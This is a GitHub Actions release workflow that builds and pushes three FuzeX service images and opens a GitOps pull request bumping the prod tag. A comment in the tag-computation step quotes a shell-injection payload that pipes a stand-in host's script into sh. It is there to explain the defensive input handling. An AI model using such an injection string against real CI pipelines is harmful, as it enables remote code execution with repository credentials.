name: Release (build + push image, bump prod tag)

# FuzeX had no deployment path at all: no chart, no Argo Application, no image
# build. services/design-frames-service/Dockerfile has been committed and built by
# nothing — no docker build, no buildx, no build-push-action in any workflow — so
# the service ran only on a developer's machine, and FuzeX could not appear in the
# FuzeFront portal because there was nothing deployed to register.
#
# Mirrors the family pattern (FuzePlan / FuzeDeploy / FuzeFinance): build -> push
# :sha and :latest -> bump the SHA into values-prod.yaml so Argo syncs it. The tag
# bump IS the release; prod is GitOps and is never hand-deployed.
#
# THREE images, not one: design-frames-service used to serve its own
# Module-Federation remote (webapp/'s built dist/) from the same vanilla
# process — the family's one Node/Express-serving deviation from the
# nginx-serving-stage standard, and the reason the federation gate's layer-4
# (nginx conf) extractor could not read this repo. That remote is now built
# and pushed as its own image below (`webapp-mfe`, Dockerfile's `webapp-mfe`
# target, nginx:alpine), same as FuzeAgent / FuzeBI / FuzeService / FuzeContact
# / FuzeSales already do — alongside the vanilla REST-API image and the
# Postgres lifecycle tier image.

on:
  pull_request:
    # Build WITHOUT pushing on every PR that touches a build input. The image has
    # never been compiled, so "does this Dockerfile build?" is an open question
    # that belongs in a PR rather than on master.
    types: [opened, synchronize, reopened, ready_for_review]
    paths:
      - 'services/design-frames-service/**'
      - '.github/workflows/release.yml'
  push:
    branches: [master]
    # `deploy/**` is DELIBERATELY ABSENT. The bump job commits to
    # deploy/helm/fuzex/values-prod.yaml under a real user's PAT — an identity
    # whose pushes DO start workflows — so listing the chart here would make every
    # release re-trigger itself. Chart edits need no rebuild anyway.
    paths:
      - 'services/design-frames-service/**'
      - '.github/workflows/release.yml'
  workflow_dispatch:
    inputs:
      image_tag:
        description: 'Override image tag (default: short SHA)'
        required: false
        default: ''

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

env:
  REGISTRY: ghcr.io
  IMAGE: ghcr.io/izzywdev/fuzex-design-frames-service
  # Postgres lifecycle tier (services/design-frames-service/backend/ + db/,
  # docs/postgres-tier.md) — a separate image, same Dockerfile, `postgres-tier`
  # build target. Shared by the postgres-tier Deployment and the db-migrate
  # Job (deploy/helm/fuzex/templates/).
  IMAGE_POSTGRES_TIER: ghcr.io/izzywdev/fuzex-design-frames-postgres-tier
  # The Module-Federation remote's nginx-serving-stage image (Dockerfile's
  # `webapp-mfe` build target). Shared by nothing else — its own Deployment +
  # Service (deploy/helm/fuzex/templates/webapp-mfe.yaml).
  IMAGE_WEBAPP_MFE: ghcr.io/izzywdev/fuzex-webapp-mfe

jobs:
  build-push:
    name: Build image${{ github.event_name == 'pull_request' && ' (no push)' || ' & push' }}
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      # webapp/'s builder stage `npm install`s the private
      # @izzywdev/fuzefront-design-system from GitHub Packages — see the
      # "package-access prerequisite" note below the build step.
    outputs:
      image_tag: ${{ steps.tag.outputs.image_tag }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Compute image tag
        id: tag
        shell: bash
        # INPUT_TAG comes through `env:` rather than being interpolated into the
        # script. `${{ github.event.inputs.* }}` is substituted into the shell
        # source BEFORE bash parses it, so a workflow_dispatch run started with
        # image_tag = `x"; curl evil.sh | sh; #` executes that as its own command,
        # on a runner holding GITHUB_TOKEN with packages:write. As an environment
        # variable it is only ever data. (Semgrep
        # yaml.github-actions.security.run-shell-injection.)
        env:
          INPUT_TAG: ${{ github.event.inputs.image_tag }}
        run: |
          set -euo pipefail
          if [ -n "$INPUT_TAG" ]; then
            TAG="$INPUT_TAG"
          else
            TAG="$(git rev-parse --short=12 HEAD)"
          fi
          # And validate it regardless of where it came from: this string becomes a
          # container tag and is written into values-prod.yaml, so anything outside
          # the OCI tag grammar has no business reaching either.
          case "$TAG" in
            *[!A-Za-z0-9._-]*|'' )
              echo "::error::image_tag '$TAG' is not a valid OCI tag (A-Za-z0-9._- only)"
              exit 1 ;;
          esac
          echo "image_tag=$TAG" >> "$GITHUB_OUTPUT"
          echo "Image tag: $TAG"

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f # v3.12.0

      - name: Log in to GHCR
        if: github.event_name != 'pull_request'
        uses: docker/login-action@c94ce9fb468520275223c153574b00df6fe4bcc9 # v3.7.0
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      # Context is the SERVICE directory, not the repo root: the Dockerfile copies
      # `package.json` and `.` relative to itself, and the repo root holds the
      # unrelated Figma plugin/bridge sources.
      # webapp/'s builder stage `npm install`s the private
      # @izzywdev/fuzefront-design-system from GitHub Packages (webapp/.npmrc
      # reads ${GITHUB_TOKEN}). Passed as a BuildKit secret (not a build-arg
      # or ENV), so it never lands in an image layer or the layer cache.
      #
      # PREREQUISITE this workflow cannot satisfy from code: the default
      # Actions GITHUB_TOKEN can read @izzywdev/* GitHub Packages ONLY if that
      # package's settings grant this repo (izzywdev/FuzeX) Actions access
      # (package → Manage Actions access). If it doesn't, `npm install` 401s
      # here and this step goes red — see the docker-build job's identical
      # dependency in design-frames-service-ci.yml.
      - name: Build design-frames-service image
        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83 # v6.18.0
        with:
          context: ./services/design-frames-service
          file: ./services/design-frames-service/Dockerfile
          push: ${{ github.event_name != 'pull_request' }}
          tags: |
            ${{ env.IMAGE }}:${{ steps.tag.outputs.image_tag }}
            ${{ env.IMAGE }}:latest
          secrets: |
            github_token=${{ secrets.GITHUB_TOKEN }}
          cache-from: type=gha,scope=fuzex-design-frames-service
          cache-to: type=gha,scope=fuzex-design-frames-service,mode=max

      # The Postgres LIFECYCLE TIER (services/design-frames-service/backend/ +
      # db/, docs/postgres-tier.md) — a SEPARATE image from the one above,
      # built from the SAME Dockerfile's `postgres-tier` target, tagged with
      # the SAME image_tag so both images move together on one release.
      # Shared by BOTH the postgres-tier Deployment and the db-migrate Job
      # (deploy/helm/fuzex/templates/), so this is the only extra image the
      # tier needs.
      #
      # `identity` is an ADDITIONAL build context (not the primary `context`
      # above): backend/package.json's local workspace dependency
      # `@fuzex/identity` (`file:../../../packages/identity`) lives at the
      # repo root, outside services/design-frames-service/ — see the
      # Dockerfile's `identity-builder` stage comment for the full reasoning.
      # Path is relative to this step's working directory (the repo root
      # checkout), NOT to `context`.
      - name: Build design-frames-service postgres-tier image
        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83 # v6.18.0
        with:
          context: ./services/design-frames-service
          file: ./services/design-frames-service/Dockerfile
          target: postgres-tier
          build-contexts: |
            identity=./packages/identity
          push: ${{ github.event_name != 'pull_request' }}
          tags: |
            ${{ env.IMAGE_POSTGRES_TIER }}:${{ steps.tag.outputs.image_tag }}
            ${{ env.IMAGE_POSTGRES_TIER }}:latest
          cache-from: type=gha,scope=fuzex-design-frames-postgres-tier
          cache-to: type=gha,scope=fuzex-design-frames-postgres-tier,mode=max

      # The Module-Federation remote's family-standard nginx-serving-stage
      # image — SEPARATE from the vanilla image above (this is the migration:
      # server.js no longer serves /apps/fuzex/ itself). Same build-secret
      # need as the vanilla image's webapp-builder stage: webapp/'s builder
      # `npm install`s the private @izzywdev/fuzefront-design-system from
      # GitHub Packages, so `github_token` is passed the same way.
      - name: Build webapp-mfe image (Module-Federation remote, nginx-serving stage)
        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83 # v6.18.0
        with:
          context: ./services/design-frames-service
          file: ./services/design-frames-service/Dockerfile
          target: webapp-mfe
          push: ${{ github.event_name != 'pull_request' }}
          tags: |
            ${{ env.IMAGE_WEBAPP_MFE }}:${{ steps.tag.outputs.image_tag }}
            ${{ env.IMAGE_WEBAPP_MFE }}:latest
          secrets: |
            github_token=${{ secrets.GITHUB_TOKEN }}
          cache-from: type=gha,scope=fuzex-webapp-mfe
          cache-to: type=gha,scope=fuzex-webapp-mfe,mode=max

  bump-prod-values:
    name: Bump prod image tag (GitOps release, via PR)
    needs: build-push
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-latest
    permissions:
      # `contents: write` so this job can push the bump BRANCH (never master —
      # see the PR step below) with the built-in GITHUB_TOKEN when no
      # GH_RELEASE_PAT is configured. `pull-requests: write` so it can open the
      # PR and attach the `auto-merge` label with that same fallback token.
      contents: write
      pull-requests: write
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          ref: master
          # GH_RELEASE_PAT preferred when present; falls back to GITHUB_TOKEN.
          # See "Resolve the release credential" below for what each buys you.
          token: ${{ secrets.GH_RELEASE_PAT || secrets.GITHUB_TOKEN }}

      # Resolve which credential pushes the bump branch / opens the PR.
      # GH_RELEASE_PAT is preferred when present; otherwise the built-in
      # GITHUB_TOKEN is used. This resolver's PAT-preferred / GITHUB_TOKEN-
      # fallback SHAPE is unchanged from before — what changed is what the
      # commit target is (a branch + PR, never master directly) and, as a
      # result, what the GITHUB_TOKEN fallback can no longer promise. Read on.
      #
      # WHY THIS JOB IS PR-BASED NOW, NOT A DIRECT COMMIT. `master` carries a
      # `Protect default branch` ruleset (required PR + review + 6 required
      # status checks, linear history). A direct contents-API PUT to master —
      # what this job used to do — is REJECTED by that ruleset:
      #
      #   gh: Repository rule violations found
      #   Changes must be made through a pull request.
      #   6 of 6 required status checks are expected. (HTTP 409)
      #
      # That is NOT a credential problem (GH_RELEASE_PAT vs GITHUB_TOKEN made
      # no difference — both are same-repo `contents: write` and the API
      # accepted the identity fine); it is the ruleset itself refusing a
      # branchless write. So the fix routes the bump through a branch + PR,
      # exactly like every other automated change in this repo (see
      # governance-sync.yml, a2a-maintain.yml).
      #
      # WHAT THIS MEANS FOR THE GITHUB_TOKEN FALLBACK. GitHub suppresses new
      # workflow runs triggered by the built-in GITHUB_TOKEN (to prevent
      # recursive runs) — this applied to `deploy/**` pushes before too, but
      # this job's own `paths:` filter deliberately never listed `deploy/**`,
      # so it never mattered. It matters now: a branch PUSHED and a PR OPENED
      # with GITHUB_TOKEN will NOT trigger this repo's `pull_request`-gated
      # required checks (harden-gate, ci, etc.), so the PR sits at "6 of 6
      # required status checks are expected" and can never satisfy the
      # ruleset to merge — a different, quieter way to end up stuck. A real
      # user PAT's pushes DO start workflows, which used to be treated here as
      # a hazard to suppress; on the PR path it is the thing that makes the
      # PR mergeable at all, so GH_RELEASE_PAT is now effectively required for
      # this job to produce a mergeable PR, even though — per the fallback
      # shape kept below — the job itself does not hard-fail without it.
      - name: Resolve the release credential
        env:
          PAT: ${{ secrets.GH_RELEASE_PAT }}
        run: |
          set -euo pipefail
          if [ -n "${PAT}" ]; then
            echo "release credential: GH_RELEASE_PAT"
            echo "RELEASE_CRED=pat" >> "$GITHUB_ENV"
          else
            echo "::notice::GH_RELEASE_PAT is not set — pushing the tag-bump branch and opening its PR with the built-in GITHUB_TOKEN."
            echo "::warning::A branch pushed and a PR opened with GITHUB_TOKEN do NOT trigger this repo's required pull_request checks (GitHub suppresses new workflow runs caused by the built-in token). The PR below will report '6 of 6 required status checks are expected' and never go green on its own — it cannot be merged until either GH_RELEASE_PAT is added (a real user PAT with 'repo' scope — the fix for good) or a human pushes an empty commit / re-triggers the checks on that PR by hand (unsticks this one release only)."
            echo "RELEASE_CRED=github_token" >> "$GITHUB_ENV"
          fi

      - name: Bump the image tag in values-prod.yaml
        env:
          TAG: ${{ needs.build-push.outputs.image_tag }}
        shell: bash
        run: |
          set -euo pipefail
          python3 - "$TAG" <<'PY'
          import re, sys
          tag = sys.argv[1]
          path = "deploy/helm/fuzex/values-prod.yaml"
          s = open(path, encoding="utf-8").read()
          pat = re.compile(r'(^image:\n(?:\s*#.*\n)*\s*tag:\s*)"?[^"\s]+"?', re.MULTILINE)
          s, n = pat.subn(lambda m: m.group(1) + f'"{tag}"', s, count=1)
          if n != 1:
              raise SystemExit(f"FATAL: could not find the image tag line in {path} — refusing to release a half-bumped overlay")
          # postgresTier's image.tag — matched via its own sentinel comment
          # (not the `^image:` anchor above, which only matches the
          # top-level, unindented image block) so this bump does not depend
          # on postgresTier's indentation depth staying exactly as it is today.
          pat2 = re.compile(r'(# POSTGRES_TIER_IMAGE_TAG.*\n(?:\s*#.*\n)*\s*tag:\s*)"?[^"\s]+"?', re.MULTILINE)
          s, n2 = pat2.subn(lambda m: m.group(1) + f'"{tag}"', s, count=1)
          if n2 != 1:
              raise SystemExit(f"FATAL: could not find the POSTGRES_TIER_IMAGE_TAG line in {path} — refusing to release a half-bumped overlay")
          # webappMfe's image.tag — same sentinel-comment approach, same reason.
          pat3 = re.compile(r'(# WEBAPP_MFE_IMAGE_TAG.*\n(?:\s*#.*\n)*\s*tag:\s*)"?[^"\s]+"?', re.MULTILINE)
          s, n3 = pat3.subn(lambda m: m.group(1) + f'"{tag}"', s, count=1)
          if n3 != 1:
              raise SystemExit(f"FATAL: could not find the WEBAPP_MFE_IMAGE_TAG line in {path} — refusing to release a half-bumped overlay")
          open(path, "w", encoding="utf-8", newline="\n").write(s)
          print(f"bumped {path} -> {tag} (image.tag + postgresTier.image.tag + webappMfe.image.tag)")
          PY
          git --no-pager diff -- deploy/helm/fuzex/values-prod.yaml

      # -----------------------------------------------------------------------
      # Opening this PR is the ONLY part of the release that can lose completed
      # work, so it is the part that retries.
      #
      # Measured failure (2026-08-25): the image built, values-prod.yaml was
      # bumped in-workspace from 6aa1c11f6aff to 4a0212dcf891, and then this
      # step died with "API rate limit already exceeded for user ID ..." —
      # discarding the bump. Prod has not moved since 2026-08-21. The cause is
      # account-wide, not repo-local: one user identity drives every repo's
      # release automation in this fleet and its API quota is shared and
      # regularly exhausted. That cannot be fixed from inside this workflow.
      # What CAN be fixed from here is this repo silently destroying a finished
      # build when it happens. Two changes do that:
      #
      #   1. The bump branch is PUSHED BEFORE any API call. `git push` speaks
      #      the git protocol, not the REST/GraphQL API, and is unaffected by
      #      the quota that fails this step — so once the push lands, the
      #      computed bump is durable on origin no matter what the API does
      #      next, and a human (or a re-run) can finish the release from it.
      #      This is deliberately preferred over an artifact upload: artifact
      #      storage is itself exhausted account-wide right now ("Artifact
      #      storage quota has been hit"), so an upload would be a new way for
      #      this step to fail rather than a safety net. The branch is better
      #      preservation anyway — it is already in the shape the PR needs.
      #
      #   2. Every API call retries with backoff driven by what GitHub actually
      #      reports (Retry-After, then x-ratelimit-reset, then exponential
      #      with jitter), bounded by a total wall-clock budget so the job can
      #      never sit on a runner for an hour. When the budget is spent the
      #      step FAILS — loudly, naming that the image shipped and the tag did
      #      not, and naming the branch the bump is sitting on. No `|| true`,
      #      no continue-on-error: an unbumped prod must be red.
      # -----------------------------------------------------------------------
      - name: Open the tag-bump PR (branch — master requires a PR, not a direct commit)
        env:
          # Fall back to the built-in token. `${A:-$B}` is resolved by bash, not
          # by the expression engine, so an unset PAT yields GITHUB_TOKEN rather
          # than an empty string that would 401 halfway through.
          RELEASE_PAT: ${{ secrets.GH_RELEASE_PAT }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ needs.build-push.outputs.image_tag }}
        shell: bash
        run: |
          set -euo pipefail
          export GH_TOKEN="${RELEASE_PAT:-$GITHUB_TOKEN}"
          F=deploy/helm/fuzex/values-prod.yaml
          if git diff --quiet -- "$F"; then
            echo "No change to $F — already at ${TAG}."
            exit 0
          fi

          BRANCH="release/bump-fuzex-${TAG}"
          REPO="${{ github.repository }}"
          OWNER="${REPO%%/*}"

          # ---- preserve the bump first -------------------------------------
          git config user.name  "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git checkout -b "$BRANCH"
          git add "$F"
          git commit -m "chore(release): bump fuzex prod image tag to ${TAG}"

          # `git ls-remote` is git protocol, not the API — safe to call even
          # when the API quota is gone. If a previous run of this release
          # already pushed the branch, its commit is the bump and re-pushing a
          # freshly-made one would be a non-fast-forward; leave it alone and go
          # straight to opening the PR it never managed to open.
          if git ls-remote --exit-code --heads origin "$BRANCH" >/dev/null 2>&1; then
            echo "Branch ${BRANCH} already exists on origin — the ${TAG} bump is already preserved there; not re-pushing."
          else
            # actions/checkout persisted the resolved token's credential helper
            # above (token: GH_RELEASE_PAT || GITHUB_TOKEN), so a plain push works.
            git push origin "HEAD:refs/heads/${BRANCH}"
            echo "Pushed ${BRANCH} — the computed bump is now durable on origin."
          fi

          # ---- API plumbing: retry on rate limits, fail loudly otherwise ----
          API_OUT="$(mktemp)"; API_ERR="$(mktemp)"
          trap 'rm -f "$API_OUT" "$API_ERR"' EXIT

          # `-i` keeps the response headers, which is the only way to honour
          # GitHub's own rate-limit signalling instead of guessing a sleep.
          resp_status() { head -n1 "$API_OUT" | tr -d '\r' | awk '{print $2}'; }
          resp_header() { grep -i "^$1:" "$API_OUT" 2>/dev/null | head -n1 | cut -d: -f2- | tr -d ' \r' || true; }
          resp_body()   { awk 'BEGIN{h=1} h && /^\r?$/ {h=0; next} !h' "$API_OUT"; }

          MAX_ATTEMPTS=6
          # Total wall-clock waiting allowed across every call in this step. The
          # core quota resets hourly, so a single reset can be ~60 min out; 15
          # is the point where failing legibly beats holding a runner hostage.
          MAX_TOTAL_WAIT=900
          waited=0

          fail_loud() {
            {
              echo "### Release incomplete — image pushed, prod tag NOT bumped"
              echo
              echo "- Image **ghcr.io/izzywdev/fuzex-design-frames-service:${TAG}** was built and pushed to GHCR."
              echo "- \`deploy/helm/fuzex/values-prod.yaml\` was bumped to \`${TAG}\` and that commit **is preserved on branch \`${BRANCH}\`** on origin."
              echo "- The tag-bump PR could **not** be opened: $1"
              echo "- Prod stays pinned to the previous tag until a PR from \`${BRANCH}\` into \`master\` is opened and merged."
              echo
              echo "Re-run this job once the API quota resets, or open the PR by hand from \`${BRANCH}\`."
            } >> "$GITHUB_STEP_SUMMARY"
            echo "::error title=Release incomplete: image pushed, prod tag NOT bumped::$1 The image ghcr.io/izzywdev/fuzex-design-frames-service:${TAG} WAS built and pushed, and the computed values-prod.yaml bump IS preserved on branch '${BRANCH}' on origin — nothing was lost. But prod is still pinned to the previous tag until a PR from '${BRANCH}' into master is opened and merged. Re-run this job after the quota resets, or open that PR by hand. Durable fix: this fleet funnels every repo's release automation through a single user PAT, so one shared API quota gates all of them; give release automation its own identity (a GitHub App) instead."
            exit 1
          }

          # api_call <human label> <gh api args...>
          # Returns 0 with the response in $API_OUT, or 1 when the call is
          # unretryable or the retry budget is spent.
          api_call() {
            local label="$1"; shift
            local attempt=1 status remaining retry_after reset sleep_for src budget_left
            while :; do
              if gh api -i "$@" >"$API_OUT" 2>"$API_ERR"; then
                return 0
              fi
              status="$(resp_status || true)"
              status="${status:-000}"
              remaining="$(resp_header x-ratelimit-remaining)"
              retry_after="$(resp_header retry-after)"
              reset="$(resp_header x-ratelimit-reset)"
              case "$retry_after" in ''|*[!0-9]*) retry_after="" ;; esac
              case "$reset"       in ''|*[!0-9]*) reset=""       ;; esac

              echo "::group::${label}: attempt ${attempt} failed (HTTP ${status})"
              head -c 2000 "$API_ERR" || true
              resp_body | head -c 2000 || true
              echo
              echo "::endgroup::"

              # Retry only what can succeed later. 401/404/422 mean the request
              # itself is wrong and will still be wrong in ten minutes.
              case "$status" in
                403|429|5??|000) : ;;
                *) echo "${label}: HTTP ${status} is not a retryable condition."; return 1 ;;
              esac

              if [ "$attempt" -ge "$MAX_ATTEMPTS" ]; then
                echo "${label}: giving up after ${MAX_ATTEMPTS} attempts."
                return 1
              fi

              # Prefer what GitHub told us over any guess of ours.
              if [ -n "$retry_after" ]; then
                sleep_for="$retry_after"; src="Retry-After header (secondary rate limit)"
              elif [ "${remaining:-1}" = "0" ] && [ -n "$reset" ]; then
                sleep_for="$(( reset - $(date -u +%s) + 5 ))"; src="x-ratelimit-reset header (primary rate limit)"
              else
                sleep_for="$(( 15 * (1 << (attempt - 1)) ))"; src="exponential backoff"
              fi
              # `[ x ] && y` at statement level would abort the whole script
              # under `set -e` whenever the test is false, so: if/then.
              if [ "$sleep_for" -lt 1 ]; then sleep_for=1; fi
              # Jitter, so concurrent releases across the fleet do not all wake
              # at the same instant and re-exhaust the shared quota together.
              sleep_for="$(( sleep_for + RANDOM % 10 ))"

              budget_left="$(( MAX_TOTAL_WAIT - waited ))"
              if [ "$budget_left" -le 0 ]; then
                echo "${label}: ${MAX_TOTAL_WAIT}s rate-limit wait budget exhausted."
                return 1
              fi
              if [ "$sleep_for" -gt "$budget_left" ]; then sleep_for="$budget_left"; fi

              echo "${label}: waiting ${sleep_for}s (${src}), then attempt $(( attempt + 1 ))/${MAX_ATTEMPTS}. Budget used: ${waited}s of ${MAX_TOTAL_WAIT}s."
              sleep "$sleep_for"
              waited="$(( waited + sleep_for ))"
              attempt="$(( attempt + 1 ))"
            done
          }

          # `gh pr list` / `gh pr create` route through gh's GraphQL API for
          # repository/PR resolution, and that is the quota that has been
          # exhausted here (run #32632618648). Every call below is plain REST
          # via `gh api` instead: `gh pr list --head` becomes a filtered GET on
          # /pulls, `gh pr create` a POST, and the label a separate POST on the
          # issues API (REST pulls-create takes no label parameter).
          api_call "look up an existing tag-bump PR" \
            "repos/${REPO}/pulls?head=${OWNER}:${BRANCH}&state=open" \
            || fail_loud "querying open PRs for ${BRANCH} failed."
          existing_pr="$(resp_body | jq -r '.[0].number // empty')"
          if [ -n "$existing_pr" ]; then
            echo "PR #$existing_pr already open for $BRANCH — nothing to do."
            exit 0
          fi

          PR_BODY="$(cat <<BODY
          Automated GitOps release bump. \`services/design-frames-service\` built and
          pushed \`ghcr.io/izzywdev/fuzex-design-frames-service:${TAG}\` from
          ${{ github.sha }}; Argo syncs \`deploy/helm/fuzex/values-prod.yaml\` once this
          merges.

          This lands as a PR, not a direct commit to \`master\`: the \`Protect default
          branch\` ruleset requires a pull request with all required status checks
          green, which a contents-API PUT straight to \`master\` cannot satisfy (HTTP
          409, \"Changes must be made through a pull request\").

          \`enabled\` and \`ingress.*\` are untouched here — the go-live switch is a
          separate, deliberately reviewed PR, never bundled with a routine tag bump.

          Note this repo has \`hardening.deployOnPush: true\`, so \`auto-merge.yml\`
          will NOT auto-merge this — it must be merged by a human in a deploy
          window, same as any other change here.
          BODY
          )"

          api_call "open the tag-bump PR" -X POST "repos/${REPO}/pulls" \
            -f title="chore(release): bump fuzex prod image tag to ${TAG}" \
            -f head="${BRANCH}" \
            -f base="master" \
            -f body="${PR_BODY}" \
            || fail_loud "creating the pull request failed."
          PR_NUMBER="$(resp_body | jq -r '.number')"

          api_call "label the tag-bump PR auto-merge" \
            -X POST "repos/${REPO}/issues/${PR_NUMBER}/labels" \
            -f "labels[]=auto-merge" \
            || fail_loud "PR #${PR_NUMBER} was opened but could not be labelled auto-merge; add the label to it by hand."

          echo "Opened tag-bump PR #${PR_NUMBER} for ${TAG} on branch ${BRANCH}."
